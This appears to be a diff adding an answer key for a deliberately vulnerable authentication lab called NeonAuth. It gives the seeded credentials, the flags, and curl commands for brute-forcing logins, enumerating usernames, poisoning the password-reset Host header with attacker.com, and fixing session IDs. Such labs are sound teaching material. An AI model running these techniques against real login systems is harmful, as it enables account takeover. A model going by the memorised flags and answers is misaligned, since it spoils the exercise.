@@ -1,0 +1,110 @@
+===============================================================================
+  NeonAuth — Broken Authentication Lab Solutions (Port 5005)
+===============================================================================
+
+  Known credentials (from database seed):
+    admin    / sunshine       (role: admin)
+    operator / password123    (role: operator)
+    guest    / guest          (role: guest)
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 1: Weak Password — Operator Account
+Flag: FLAG{w34k_p4ss_0p3r4t0r}
+
+  The /challenge/weak-password endpoint accepts brute-force attempts
+  with no rate limiting. The operator account has a weak password.
+
+  curl -X POST http://localhost:5005/challenge/weak-password \
+    -d "username=operator&password=password123"
+
+  Common wordlist entries to try: password, password123, 123456, admin
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 2: Admin Brute Force — No Rate Limiting
+Flag: FLAG{4uth_4dm1n_br34ch}
+
+  The /brute endpoint has no rate limiting or account lockout.
+  The admin password is a common dictionary word.
+
+  curl -X POST http://localhost:5005/brute \
+    -H "Content-Type: application/json" \
+    -d '{"username": "admin", "password": "sunshine"}'
+
+  Brute-force approach (try common passwords):
+    for pw in password admin 123456 sunshine letmein; do
+      echo "Trying: $pw"
+      curl -s -X POST http://localhost:5005/brute \
+        -H "Content-Type: application/json" \
+        -d "{\"username\":\"admin\",\"password\":\"$pw\"}" | grep FLAG
+    done
+
+  The response contains the flag when login succeeds.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 3: Username Enumeration
+Flag: (no direct flag — information disclosure)
+
+  The /login endpoint returns different error messages:
+    - "User not found" — username doesn't exist
+    - "Invalid password" — username exists but wrong password
+
+  This allows attackers to enumerate valid usernames:
+
+  curl -X POST http://localhost:5005/login \
+    -d "username=admin&password=wrong"
+  # Returns: "Invalid password" (confirms "admin" exists)
+
+  curl -X POST http://localhost:5005/login \
+    -d "username=nonexistent&password=wrong"
+  # Returns: "User not found" (confirms user doesn't exist)
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 4: Password Reset — Host Header Poisoning
+Flag: FLAG{r3s3t_p01s0n_h0st}
+
+  The /reset endpoint generates a password reset link using
+  request.host, which can be poisoned via the Host header.
+
+  Step 1: Request a reset for admin with poisoned Host header:
+    curl -X POST http://localhost:5005/reset \
+      -H "Host: attacker.com" \
+      -d "username=admin"
+
+  Step 2: The response shows the reset link with the attacker's domain.
+  Extract the token from the link.
+
+  Step 3: Use the token to access the flag:
+    curl "http://localhost:5005/reset/confirm?token=<TOKEN>"
+
+  The confirmation page displays the flag.
+
+-------------------------------------------------------------------------------
+
+CHALLENGE 5: Session Fixation
+Flag: FLAG{s3ss10n_f1x4t10n_vuln}
+
+  The session cookie (neonauth_session) is NOT regenerated after login.
+  If an attacker sets a known session ID before the victim logs in,
+  the attacker can hijack the session after login.
+
+  Step 1: Set a known session cookie:
+    curl -c cookies.txt http://localhost:5005/
+    # Note the neonauth_session value
+
+  Step 2: Login as admin with the same cookie:
+    curl -b cookies.txt -c cookies.txt -X POST http://localhost:5005/login \
+      -d "username=admin&password=sunshine"
+
+  Step 3: Access the dashboard (session now has admin role):
+    curl -b cookies.txt http://localhost:5005/dashboard
+
+  The dashboard shows the flag when accessed with admin role.
+  The vulnerability is that the pre-login session ID persists after
+  authentication — in a real attack, the attacker tricks the victim
+  into using a session ID the attacker already knows.
+
+===============================================================================
